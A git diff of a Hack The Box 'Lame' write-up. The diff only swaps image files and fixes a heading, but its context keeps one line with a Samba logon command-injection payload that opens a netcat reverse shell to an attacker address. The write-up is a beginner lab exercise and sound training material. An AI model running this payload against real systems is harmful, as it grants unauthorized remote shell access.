@@ -4,9 +4,9 @@ icon: face-cowboy-hat
 
 # HTB-LAME
 
-<figure><img src="../../../../.gitbook/assets/image (288).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (287).png" alt=""><figcaption></figcaption></figure>
 
-#### 1.  Overview
+#### 1. Overview
 
 Lame is a Linux machine and the **first-ever box** on Hack The Box. It introduces beginners to **basic enumeration**, **service exploitation**, and **gaining root via Samba vulnerabilities**. The exploitation path is simple and straightforward, requiring only a single exploit to achieve root.
 
@@ -196,4 +196,4 @@ logon “./=`nohup nc -e /bin/bash 10.10.14.7 4444`"
 * logon:- it is used to login into smb
 * nohup:-run a command immune to hangups, with output to a non-tty<br>
 
-<figure><img src="../../../../.gitbook/assets/complete (9).gif" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
